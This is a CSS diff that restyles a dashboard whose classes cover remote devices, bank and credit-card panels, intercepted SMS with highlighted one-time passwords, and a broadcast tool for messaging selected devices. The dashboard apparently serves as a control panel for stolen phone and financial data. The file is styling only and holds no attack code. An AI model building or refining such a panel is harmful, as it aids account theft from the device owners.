+html{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;-webkit-font-smoothing:antialiased}
+body{min-height:100vh;overflow-x:hidden}
+input,textarea,select,button{font-family:inherit;outline:none;border:none}
+button{cursor:pointer;background:none;color:inherit}
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
+.flex1{flex:1}.min0{min-width:0}
+.flex{display:flex}.items-center{align-items:center}.justify-between{justify-content:space-between}
+
+#login-page{min-height:100vh;display:flex;align-items:center;justify-content:center;
+background:radial-gradient(ellipse 80% 60% at 70% 0%,#2a0a0a 0%,transparent 60%),
+radial-gradient(ellipse 70% 50% at 30% 100%,#0a1240 0%,transparent 65%),var(--bg);padding:20px}
+.login-box{width:100%;max-width:400px;text-align:center}
+.logo-ring{width:72px;height:72px;border-radius:20px;background:var(--grad);
+display:inline-flex;align-items:center;justify-content:center;margin-bottom:22px;
+box-shadow:0 12px 36px rgba(228,0,0,.35)}
+.logo-text{font-family:'Orbitron',sans-serif;font-weight:900;font-size:26px;letter-spacing:2px;
+background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;font-style:italic}
+.login-sub{font-size:11px;color:var(--text3);margin:8px 0 28px;letter-spacing:3px;
+text-transform:uppercase;font-family:'Orbitron',sans-serif;font-weight:700}
+
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 16px;
+border-radius:var(--radius);font-size:13px;font-weight:700;transition:all .15s;text-decoration:none}
+.btn-red{background:var(--grad-r);color:#fff;box-shadow:0 4px 14px rgba(228,0,0,.3)}
+.btn-red:hover{filter:brightness(1.08)}
+.btn-ghost{background:var(--bg3);border:1px solid var(--border2);color:var(--text2)}
+.btn-ghost:hover{color:var(--text)}
+.btn-sm{padding:6px 12px;font-size:12px}
+.btn-icon{padding:8px;border-radius:var(--radius);background:var(--bg3);border:1px solid var(--border);color:var(--text3)}
+
+#main-page{display:none;min-height:100vh;flex-direction:column}
+.topbar{position:sticky;top:0;z-index:40;background:rgba(8,9,11,.92);backdrop-filter:blur(14px);
+border-bottom:1px solid var(--border);padding:0 16px;height:56px;display:flex;align-items:center;gap:10px;
+padding-top:env(safe-area-inset-top);flex-wrap:wrap;min-height:56px;height:auto}
+.topbar-logo{display:flex;align-items:center;gap:8px;font-family:'Orbitron',sans-serif;
+font-weight:900;font-size:13px;letter-spacing:1px;font-style:italic}
+.topbar-logo .eagle{font-size:20px}
+.topbar-logo .name{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.search-wrap{position:relative;flex:1;max-width:300px;min-width:140px}
+.search-wrap svg{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text3)}
+.search-inp{width:100%;padding:8px 12px 8px 32px;background:var(--bg3);border:1px solid var(--border);
+border-radius:var(--radius);font-size:12px;color:var(--text)}
+.search-inp:focus{border-color:var(--red)}
+.clock{font-size:11px;color:var(--text3);font-family:'JetBrains Mono',monospace}
+
+.nav-links{display:flex;gap:8px;padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--border);overflow-x:auto}
+.nav-link{padding:8px 14px;border-radius:10px;font-size:12px;font-weight:700;text-decoration:none;
+color:var(--text2);background:var(--bg3);border:1px solid var(--border);white-space:nowrap;transition:.15s}
+.nav-link.active{background:var(--grad);color:#fff;border-color:transparent;box-shadow:0 4px 12px rgba(228,0,0,.25)}
+.nav-link.green{background:rgba(34,197,94,.12);color:#4ade80;border-color:rgba(34,197,94,.3)}
+.nav-link.green.active{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff;border-color:transparent}
+
+.stats-bar{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 16px;display:flex;overflow-x:auto}
+.stat-item{padding:10px 16px;border-right:1px solid var(--border);flex-shrink:0}
+.stat-n{font-size:18px;font-weight:900;line-height:1;font-family:'Orbitron',sans-serif}
+.stat-l{font-size:9px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.06em;margin-top:3px}
+
+.filter-bar{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 16px;
+display:flex;align-items:center;gap:6px;overflow-x:auto}
+.filter-btn{padding:6px 12px;border-radius:20px;font-size:11px;font-weight:700;
+background:var(--bg3);border:1px solid var(--border);color:var(--text3);flex-shrink:0;transition:all .15s;cursor:pointer}
+.filter-btn.active{background:rgba(228,0,0,.15);border-color:rgba(228,0,0,.35);color:var(--red2)}
+.filter-btn.active-green{background:rgba(34,197,94,.1);border-color:rgba(34,197,94,.25);color:var(--green)}
+.filter-btn.active-purple{background:rgba(168,85,247,.1);border-color:rgba(168,85,247,.25);color:var(--purple)}
+.sort-select{padding:6px 10px;background:var(--bg3);border:1px solid var(--border);
+border-radius:var(--radius);font-size:11px;color:var(--text2);margin-left:auto}
+
+.grid-main{padding:16px;padding-bottom:90px;display:grid;
+grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
+.device-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);
+padding:14px;cursor:pointer;transition:all .15s;position:relative;overflow:hidden}
+.device-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
+background:var(--grad);opacity:0;transition:.2s}
+.device-card:hover{border-color:var(--border2);background:var(--bg3);transform:translateY(-1px)}
+.device-card:hover::before{opacity:1}
+.dev-name{font-size:13px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dev-id{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-top:2px;
+overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+.device-icon-tile{
+  width:38px;height:38px;border-radius:11px;display:flex;align-items:center;justify-content:center;
+  font-size:19px;flex-shrink:0;transition:.15s;
+  background:linear-gradient(135deg,rgba(228,0,0,.18),rgba(15,60,201,.18));
+  border:1px solid rgba(228,0,0,.3);box-shadow:0 3px 10px rgba(228,0,0,.15)
+}
+.device-icon-tile.offline{background:var(--bg3);border:1px solid var(--border);box-shadow:none;
+  filter:grayscale(.5) opacity(.7)}
+
+.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:20px;font-size:10px;font-weight:700}
+.badge-green{background:rgba(34,197,94,.15);border:1px solid rgba(34,197,94,.25);color:var(--green)}
+.badge-amber{background:rgba(245,158,11,.15);border:1px solid rgba(245,158,11,.25);color:var(--amber)}
+.badge-red{background:rgba(228,0,0,.15);border:1px solid rgba(228,0,0,.25);color:var(--red2)}
+.dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.dot-green{background:var(--green);box-shadow:0 0 6px var(--green)}
+.dot-red{background:var(--border2)}
+
+.drawer-overlay{position:fixed;inset:0;z-index:50;background:rgba(0,0,0,.7);
+backdrop-filter:blur(6px);display:none}
+.drawer-overlay.open{display:flex;justify-content:flex-end}
+.drawer{width:100%;max-width:440px;height:100%;background:var(--bg2);
+border-left:1px solid var(--border);display:flex;flex-direction:column;animation:slideIn .2s ease-out}
+@keyframes slideIn{from{transform:translateX(24px);opacity:.7}to{transform:translateX(0);opacity:1}}
+.drawer-header{padding:14px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+.drawer-icon{width:38px;height:38px;border-radius:11px;background:var(--grad);
+display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#fff;font-size:20px}
+.drawer-title{font-size:14px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.drawer-id{font-size:9px;font-family:'JetBrains Mono',monospace;color:var(--text3);margin-top:2px}
+.drawer-status{padding:8px 16px;border-bottom:1px solid var(--border);background:var(--bg3);
+display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.drawer-body{flex:1;overflow-y:auto;padding:14px}
+
+.tabs{display:flex;border-bottom:1px solid var(--border);overflow-x:auto;background:var(--bg2)}
+.tab{padding:11px 14px;font-size:11px;font-weight:700;color:var(--text3);
+border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s;cursor:pointer}
+.tab.active{color:var(--red2);border-bottom-color:var(--red)}
+.tab.active-g{color:var(--green);border-bottom-color:var(--green)}
+.tab.active-p{color:var(--purple);border-bottom-color:var(--purple)}
+.tab.active-mail{color:var(--amber);border-bottom-color:var(--amber)}
+.tab .tab-emoji{font-size:13px;margin-right:4px}
+
+.kv{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px solid var(--border)}
+.kv:last-child{border-bottom:none}
+.kv-k{font-size:11px;color:var(--text3);width:120px;flex-shrink:0}
+.kv-v{font-size:12px;font-weight:600;text-align:right;word-break:break-all}
+.kv-v.mono{font-family:'JetBrains Mono',monospace;font-size:11px}
+
+.bank-card{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.15);
+border-left:2px solid var(--green);border-radius:var(--radius);padding:12px;margin-bottom:8px}
+.cc-card{background:rgba(168,85,247,.05);border:1px solid rgba(168,85,247,.15);
+border-left:2px solid var(--purple);border-radius:var(--radius);padding:12px;margin-bottom:8px}
+.bal-big{font-size:22px;font-weight:900;font-family:'Orbitron',sans-serif}
+.sms-item{background:var(--bg3);border:1px solid var(--border);border-left:2px solid var(--border2);
+border-radius:var(--radius);padding:10px;margin-bottom:6px;position:relative}
+.sms-item.is-bank{border-left-color:rgba(34,197,94,.6)}
+.sms-item.is-card{border-left-color:rgba(168,85,247,.6)}
+.sms-item.mail-item{border-left-color:rgba(245,158,11,.8);
+  background:linear-gradient(90deg,rgba(245,158,11,.06),var(--bg3) 40%)}
+.sms-sender{font-size:11px;font-weight:700}
+.sms-time{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace}
+.sms-body{font-size:11px;color:var(--text2);line-height:1.55;margin-top:5px;word-break:break-word}
+.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;
 font-weight:800;padding:3px 7px;border-radius:6px;font-family:'Orbitron',sans-serif}
 .sms-item .msg-type-badge.otp{background:#0f3cc9;color:#fff}
 .sms-item .msg-type-badge.number{background:#12b76a;color:#fff}
 .sms-item .msg-type-badge.mail{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff}
-.sms-head{display:flex;justify-content:space-between;align-items:flex-start;
-margin-bottom:10px;gap:10px;flex-wrap:wrap;padding-right:64px}
-.sender{font-size:12px;font-weight:800;color:#E40000;font-family:'Orbitron',sans-serif;
-display:flex;align-items:center;flex-wrap:wrap}
-.sender.mail-sender{color:#f59e0b}
-.new-badge{background:var(--grad-r);color:#fff;font-size:9px;font-weight:800;
-padding:2px 6px;border-radius:10px;margin-left:6px}
-.sms-time{font-size:11px;color:var(--muted);font-weight:600;white-space:nowrap}
-.sms-time.fresh{color:#05603a;font-weight:800}
-.time-ago{font-size:10px;color:var(--muted2);font-weight:700;margin-top:2px;text-align:right}
-.time-ago.fresh{color:#05603a}
-.sms-body{font-size:14px;color:#344054;line-height:1.55;word-break:break-word;white-space:pre-wrap}
-.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;
-border-radius:4px;font-weight:800;border:1px dashed #fbbf24}
 .otp-highlight{background:linear-gradient(135deg,#d1fae5,#a7f3d0);color:#065f46;
 padding:3px 8px;border-radius:6px;font-weight:800;border:1px dashed #12b76a;
 font-family:'Orbitron',sans-serif;letter-spacing:1px}
 .otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:12px;
 padding:9px 16px;background:linear-gradient(135deg,#12b76a,#32d583);color:#fff;
 border:none;border-radius:20px;font-weight:800;font-size:12px;font-family:inherit;
-min-height:40px}
-.empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:14px;
-background:var(--card);border-radius:18px;border:1px solid var(--sep)}
-.loading-text{text-align:center;padding:26px;color:var(--muted);font-size:13px;
-background:var(--card);border-radius:18px;margin-bottom:16px;border:1px solid var(--sep)}
-.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(16,24,40,.15);
-border-top-color:#E40000;border-radius:50%;animation:spin .8s linear infinite;
-vertical-align:middle;margin-right:8px}
-@keyframes spin{to{transform:rotate(360deg)}}
-.progress-bar{width:100%;height:4px;background:rgba(16,24,40,.08);border-radius:2px;
-overflow:hidden;margin-top:12px}
-.progress-fill{height:100%;background:var(--grad);border-radius:2px;transition:width .3s}
-.live-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(18,183,106,.15);
-color:#05603a;font-size:10px;font-weight:800;padding:3px 9px;border-radius:20px;
-margin-left:8px;font-family:'Orbitron',sans-serif}
-.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#12b76a;
-animation:pulse 1.2s infinite}
-.filter-bar{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
-.filter-btn{padding:9px 14px;font-size:12px;font-weight:800;border-radius:12px;
-border:1px solid rgba(16,24,40,.15);background:var(--card);color:var(--muted);
-font-family:inherit;min-height:42px}
-.filter-btn.active{background:var(--grad);color:#fff;border-color:transparent}
-.filter-btn.amber.active{background:var(--grad-amber)}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(140px);
-background:rgba(16,24,40,.94);color:#fff;padding:14px 26px;border-radius:16px;
-font-weight:700;font-size:13px;z-index:9999;transition:transform .35s;
-pointer-events:none;max-width:90vw;text-align:center;box-shadow:0 12px 32px rgba(16,24,40,.25)}
-.toast.show{transform:translateX(-50%) translateY(0)}
-.hidden{display:none !important}
+min-height:40px;cursor:pointer}
 
-/* ══════ BROADCAST FAB (single) ══════ */
-.bc-fab{
-  position:fixed;bottom:24px;right:24px;z-index:60;
-  width:60px;height:60px;border-radius:50%;
-  background:var(--grad-amber);color:#fff;border:none;
-  display:flex;align-items:center;justify-content:center;
-  font-size:26px;
-  box-shadow:0 12px 32px rgba(245,158,11,.45),0 4px 12px rgba(249,115,22,.35);
-  transition:.2s;cursor:pointer}
-.bc-fab:hover{transform:scale(1.06) rotate(6deg);filter:brightness(1.1)}
-.bc-fab:active{transform:scale(.94)}
-.bc-fab .badge-count{
-  position:absolute;top:-4px;right:-4px;
-  min-width:22px;height:22px;padding:0 6px;
-  background:#E40000;color:#fff;border-radius:11px;
-  font-size:10px;font-weight:900;
-  display:flex;align-items:center;justify-content:center;
-  border:2px solid var(--bg);font-family:'Orbitron',sans-serif}
+.inp{width:100%;padding:10px 14px;background:var(--bg3);border:1px solid var(--border2);
+border-radius:var(--radius);font-size:13px;color:var(--text)}
+.inp:focus{border-color:var(--red)}
+textarea.inp{resize:vertical;min-height:90px;font-family:inherit}
+.section-label{font-size:10px;font-weight:700;letter-spacing:.08em;color:var(--text3);
+text-transform:uppercase;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
 
-/* ══════ BROADCAST MODAL ══════ */
-.bc-modal{position:fixed;inset:0;z-index:200;background:rgba(16,24,40,.5);
-backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:16px}
-.bc-modal.open{display:flex}
-.bc-box{
-  width:100%;max-width:640px;max-height:92vh;overflow-y:auto;
-  background:#fff;border-radius:20px;
-  box-shadow:0 30px 80px rgba(16,24,40,.35);
-  animation:popIn .2s ease-out}
-@keyframes popIn{from{transform:scale(.95);opacity:.6}to{transform:scale(1);opacity:1}}
-.bc-head{
-  padding:18px 22px;border-bottom:1px solid var(--sep);
-  display:flex;align-items:center;gap:12px;
-  background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(228,0,0,.05));
-  border-radius:20px 20px 0 0}
-.bc-head .bc-icon{
-  width:44px;height:44px;border-radius:13px;background:var(--grad-amber);
-  display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;flex-shrink:0;
-  box-shadow:0 6px 16px rgba(245,158,11,.35)}
-.bc-head .bc-title{font-family:'Orbitron',sans-serif;font-size:15px;font-weight:800;letter-spacing:1px;color:#93370d}
-.bc-head .bc-sub{font-size:11px;color:var(--muted2);margin-top:2px;font-family:monospace}
-.bc-head .close-btn{margin-left:auto;width:38px;height:38px;border-radius:11px;
-background:rgba(16,24,40,.05);color:#344054;border:none;
-display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700}
-.bc-body{padding:20px 22px}
-.bc-target-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
-.bc-ts{background:#f8fafc;border:1px solid var(--sep);border-radius:12px;padding:12px;text-align:center}
-.bc-ts .n{font-size:22px;font-weight:900;font-family:'Orbitron',sans-serif;line-height:1}
-.bc-ts .l{font-size:9px;color:var(--muted2);text-transform:uppercase;font-weight:700;
-letter-spacing:.5px;margin-top:5px;font-family:'Orbitron',sans-serif}
-.bc-ts.total{border-color:rgba(15,60,201,.25)}
-.bc-ts.total .n{color:#0F3CC9}
-.bc-ts.online{border-color:rgba(18,183,106,.25)}
-.bc-ts.online .n{color:#12b76a}
-.bc-ts.offline{border-color:rgba(228,0,0,.2)}
-.bc-ts.offline .n{color:#E40000}
-.bc-label{font-size:11px;font-weight:800;letter-spacing:.8px;color:#344054;
-text-transform:uppercase;margin-bottom:8px;font-family:'Orbitron',sans-serif;
-display:flex;justify-content:space-between;align-items:center}
-.bc-label .hint{font-size:9px;color:var(--muted2);letter-spacing:0;font-family:monospace;font-weight:600}
-.bc-modes{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
-.bc-mode{padding:9px 15px;border-radius:12px;font-size:11px;font-weight:800;
-background:#f8fafc;border:1.5px solid var(--sep);color:#475467;
-cursor:pointer;transition:.15s;font-family:'Orbitron',sans-serif;letter-spacing:.5px}
-.bc-mode:hover{border-color:#f59e0b;color:#93370d}
-.bc-mode.active{background:var(--grad-amber);color:#fff;border-color:transparent;
-box-shadow:0 4px 12px rgba(245,158,11,.3)}
-.bc-dev-list{max-height:230px;overflow-y:auto;border:1px solid var(--sep);
-border-radius:12px;background:#fafbfc;padding:6px;margin-bottom:16px}
-.bc-dev-row{display:flex;align-items:center;gap:10px;padding:10px;border-radius:9px;
-cursor:pointer;transition:.12s}
-.bc-dev-row:hover{background:rgba(245,158,11,.06)}
-.bc-dev-row.selected{background:rgba(245,158,11,.12)}
-.bc-check{width:22px;height:22px;border-radius:7px;border:2px solid #cbd5e1;
-display:flex;align-items:center;justify-content:center;flex-shrink:0;
-color:#fff;font-size:13px;font-weight:900;transition:.15s;background:#fff}
-.bc-check.checked{background:var(--grad-amber);border-color:transparent}
-.bc-dev-info{flex:1;min-width:0}
-.bc-dev-title{font-size:12px;font-weight:800;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#101828}
-.bc-dev-sub{font-size:10px;color:var(--muted2);font-family:monospace;margin-top:2px}
-.bc-dev-status{font-size:14px;flex-shrink:0}
-.bc-textarea{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid var(--sep);
-background:#f8fafc;font-size:14px;min-height:110px;font-family:inherit;outline:none;
-color:#101828;resize:vertical;transition:.2s;font-size:15px}
-.bc-textarea:focus{border-color:#f59e0b;background:#fff;box-shadow:0 0 0 4px rgba(245,158,11,.12)}
-.bc-templates{display:flex;gap:6px;margin-bottom:10px;overflow-x:auto;padding-bottom:2px}
-.bc-chip{padding:7px 13px;border-radius:20px;font-size:11px;font-weight:700;
-background:#f8fafc;border:1px solid var(--sep);color:#475467;
-white-space:nowrap;transition:.15s;cursor:pointer;font-family:inherit}
-.bc-chip:hover{border-color:#f59e0b;color:#93370d}
-.bc-counter{display:flex;justify-content:space-between;align-items:center;
-font-size:10px;color:var(--muted2);margin-top:8px;font-family:monospace;font-weight:700}
-.bc-counter.warn{color:#f79009}
-.bc-counter.over{color:#E40000}
-.bc-progress{margin-top:14px;padding:12px;border-radius:12px;background:#f8fafc;
-border:1px solid var(--sep);display:none}
-.bc-progress.show{display:block}
-.bc-progress-bar{height:5px;background:rgba(16,24,40,.08);border-radius:3px;
-overflow:hidden;margin-bottom:10px}
-.bc-progress-fill{height:100%;background:var(--grad-amber);border-radius:3px;
-transition:width .3s ease-out;width:0%}
-.bc-progress-text{font-size:11px;color:#475467;font-weight:700;font-family:monospace;text-align:center}
-.bc-actions{display:flex;gap:10px;margin-top:18px}
-.bc-actions .btn-ghost{flex:1;padding:14px;border-radius:12px;background:rgba(16,24,40,.05);
-color:#344054;border:none;font-weight:800;font-size:13px;font-family:inherit;min-height:50px}
-.bc-actions .btn-bc{flex:2;padding:14px;border-radius:12px;background:var(--grad-amber);
-color:#fff;border:none;font-weight:800;font-size:13px;font-family:inherit;min-height:50px;
-box-shadow:0 6px 16px rgba(245,158,11,.35);cursor:pointer;transition:.15s;
-display:inline-flex;align-items:center;justify-content:center;gap:8px}
-.bc-actions .btn-bc:hover{filter:brightness(1.08)}
-.bc-actions .btn-bc:disabled{opacity:.5;cursor:not-allowed}
+.empty{text-align:center;padding:48px 20px;color:var(--text3)}
+.empty-icon{font-size:36px;margin-bottom:12px;display:block}
 
-/* ══════ MAIL TAB (user inbox tab) ══════ */
+.status-emoji{
+  display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;
+  font-size:11px;font-weight:800;letter-spacing:.4px;font-family:'Orbitron',sans-serif}
+.status-emoji.online{background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);color:var(--green)}
+.status-emoji.offline{background:rgba(228,0,0,.1);border:1px solid rgba(228,0,0,.28);color:var(--red2)}
+.status-emoji .emoji{font-size:13px;line-height:1}
+
 .mail-tab-bar{display:flex;gap:8px;margin-bottom:14px}
 .mail-tab-btn{flex:1;padding:12px;border-radius:12px;font-size:12px;font-weight:800;
-background:var(--card);border:1.5px solid var(--sep);color:var(--muted);
+background:var(--bg3);border:1.5px solid var(--border2);color:var(--text3);
 font-family:'Orbitron',sans-serif;letter-spacing:.5px;cursor:pointer;min-height:46px}
-.mail-tab-btn.active{background:var(--grad-amber);color:#fff;border-color:transparent;
+.mail-tab-btn.active{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border-color:transparent;
 box-shadow:0 4px 12px rgba(245,158,11,.3)}
 
-@media(min-width:640px){.stats{grid-template-columns:repeat(4,1fr)}}
+.bc-fab{
+  position:fixed;bottom:24px;right:24px;z-index:45;
+  width:60px;height:60px;border-radius:50%;
+  background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;
+  display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;
+  box-shadow:0 10px 30px rgba(245,158,11,.45),0 4px 12px rgba(249,115,22,.35);
+  transition:.2s;cursor:pointer}
+.bc-fab:hover{transform:scale(1.06) rotate(6deg);filter:brightness(1.1)}
+.bc-fab .count-badge{position:absolute;top:-4px;right:-4px;min-width:20px;height:20px;padding:0 5px;
+  background:var(--red);color:#fff;border-radius:10px;font-size:10px;font-weight:900;
+  display:flex;align-items:center;justify-content:center;border:2px solid var(--bg);
+  font-family:'Orbitron',sans-serif}
+
+.bc-modal{position:fixed;inset:0;z-index:80;background:rgba(0,0,0,.75);
+backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;padding:16px}
+.bc-modal.open{display:flex}
+.bc-box{width:100%;max-width:640px;max-height:92vh;overflow-y:auto;
+  background:var(--bg2);border:1px solid rgba(245,158,11,.35);border-radius:18px;
+  box-shadow:0 30px 80px rgba(245,158,11,.25);animation:popIn .2s ease-out}
+@keyframes popIn{from{transform:scale(.94);opacity:.6}to{transform:scale(1);opacity:1}}
+.bc-head{padding:16px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;
+  background:linear-gradient(135deg,rgba(245,158,11,.12),rgba(228,0,0,.06))}
+.bc-head .bc-icon{width:38px;height:38px;border-radius:11px;
+  background:linear-gradient(135deg,#f59e0b,#f97316);
+  display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;flex-shrink:0}
+.bc-head .bc-title{font-family:'Orbitron',sans-serif;font-size:13px;font-weight:800;letter-spacing:1px;color:var(--amber)}
+.bc-head .bc-sub{font-size:10px;color:var(--text3);margin-top:2px;font-family:'JetBrains Mono',monospace}
+.bc-body{padding:18px}
+.bc-target-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
+.bc-ts{padding:12px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;text-align:center}
+.bc-ts .n{font-size:20px;font-weight:900;font-family:'Orbitron',sans-serif;line-height:1}
+.bc-ts .l{font-size:9px;color:var(--text3);text-transform:uppercase;font-weight:700;
+  letter-spacing:.5px;margin-top:5px;font-family:'Orbitron',sans-serif}
+.bc-ts.online{border-color:rgba(34,197,94,.3)}.bc-ts.online .n{color:var(--green)}
+.bc-ts.offline{border-color:rgba(228,0,0,.3)}.bc-ts.offline .n{color:var(--red2)}
+.bc-ts.total .n{color:var(--blue2)}
+.bc-modes{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
+.bc-mode{padding:8px 14px;border-radius:20px;font-size:11px;font-weight:800;
+  background:var(--bg3);border:1px solid var(--border2);color:var(--text3);
+  cursor:pointer;transition:.15s;font-family:'Orbitron',sans-serif;letter-spacing:.5px}
+.bc-mode:hover{border-color:var(--amber);color:var(--amber)}
+.bc-mode.active{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;
+  border-color:transparent;box-shadow:0 4px 12px rgba(245,158,11,.3)}
+.bc-dev-list{max-height:260px;overflow-y:auto;border:1px solid var(--border);
+  border-radius:12px;background:var(--bg3);padding:6px;margin-bottom:14px}
+.bc-dev-row{display:flex;align-items:center;gap:10px;padding:9px 10px;border-radius:9px;
+  cursor:pointer;transition:.12s}
+.bc-dev-row:hover{background:rgba(255,255,255,.03)}
+.bc-dev-row.selected{background:rgba(245,158,11,.1)}
+.bc-check{width:20px;height:20px;border-radius:6px;border:2px solid var(--border2);
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+  color:#fff;font-size:12px;font-weight:900;transition:.15s}
+.bc-check.checked{background:linear-gradient(135deg,#f59e0b,#f97316);border-color:transparent}
+.bc-dev-info{flex:1;min-width:0}
+.bc-dev-title{font-size:12px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.bc-dev-sub{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-top:2px}
+.bc-dev-status{font-size:11px;flex-shrink:0}
+.bc-templates{display:flex;gap:6px;margin-bottom:10px;overflow-x:auto;padding-bottom:2px}
+.bc-chip{padding:6px 12px;border-radius:20px;font-size:11px;font-weight:700;
+  background:var(--bg3);border:1px solid var(--border2);color:var(--text3);
+  white-space:nowrap;transition:.15s;cursor:pointer}
+.bc-chip:hover{border-color:var(--amber);color:var(--amber)}
+.bc-counter{display:flex;justify-content:space-between;align-items:center;
+  font-size:10px;color:var(--text3);margin-top:6px;font-family:'JetBrains Mono',monospace}
+.bc-counter.warn{color:var(--amber)}.bc-counter.over{color:var(--red2)}
+.bc-progress{margin-top:12px;padding:10px 12px;border-radius:10px;
+  background:var(--bg3);border:1px solid var(--border2);display:none}
+.bc-progress.show{display:block}
+.bc-progress-bar{height:4px;background:var(--border);border-radius:2px;overflow:hidden;margin-bottom:8px}
+.bc-progress-fill{height:100%;background:linear-gradient(135deg,#f59e0b,#f97316);border-radius:2px;
+  transition:width .3s ease-out;width:0%}
+.bc-progress-text{font-size:11px;color:var(--text2);font-weight:600;
+  font-family:'JetBrains Mono',monospace;text-align:center}
+.bc-actions{display:flex;gap:8px;margin-top:16px}
+.bc-actions .btn{flex:1;padding:13px}
+.btn-bc{background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;
+  box-shadow:0 4px 14px rgba(245,158,11,.35);border:none;
+  display:inline-flex;align-items:center;justify-content:center;gap:6px;
+  padding:13px;border-radius:10px;font-size:13px;font-weight:800;
+  transition:.15s;cursor:pointer;font-family:inherit}
+.btn-bc:hover{filter:brightness(1.08)}
+.btn-bc:disabled{opacity:.5;cursor:not-allowed}
+
+.loading-text{text-align:center;padding:26px;color:var(--text3);font-size:13px;
+background:var(--bg2);border-radius:18px;margin-bottom:16px;border:1px solid var(--border)}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.15);
+border-top-color:var(--red);border-radius:50%;animation:spin .8s linear infinite;
+vertical-align:middle;margin-right:8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress-bar{width:100%;height:4px;background:rgba(255,255,255,.08);border-radius:2px;
+overflow:hidden;margin-top:12px}
+.progress-fill{height:100%;background:var(--grad);border-radius:2px;transition:width .3s}
+
+.mail-header-card{
+  background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(228,0,0,.06));
+  border:1px solid rgba(245,158,11,.25);border-radius:12px;padding:14px;margin-bottom:14px}
+.mail-header-card .mh-title{font-family:'Orbitron',sans-serif;font-size:12px;font-weight:800;
+  letter-spacing:1px;color:var(--amber);margin-bottom:6px;display:flex;align-items:center;gap:6px}
+.mail-header-card .mh-desc{font-size:11px;color:var(--text3);line-height:1.5;margin-bottom:10px}
+.mail-header-card .mh-stats{display:flex;gap:8px;flex-wrap:wrap}
+.mail-stat-pill{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;
+  border-radius:20px;font-size:10px;font-weight:800;font-family:'Orbitron',sans-serif;letter-spacing:.4px}
+.mail-stat-pill.total{background:rgba(245,158,11,.15);color:var(--amber);border:1px solid rgba(245,158,11,.3)}
+.mail-stat-pill.devices{background:rgba(59,130,246,.15);color:var(--blue2);border:1px solid rgba(59,130,246,.3)}
+.mail-stat-pill.delivered{background:rgba(34,197,94,.15);color:var(--green);border:1px solid rgba(34,197,94,.3)}
+
+#toast{position:fixed;bottom:96px;left:50%;transform:translateX(-50%) translateY(140px);
+z-index:120;background:var(--bg4);border:1px solid var(--border2);border-radius:24px;
+padding:10px 22px;font-size:12px;font-weight:700;transition:transform .3s;pointer-events:none;
+max-width:90vw;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.5)}
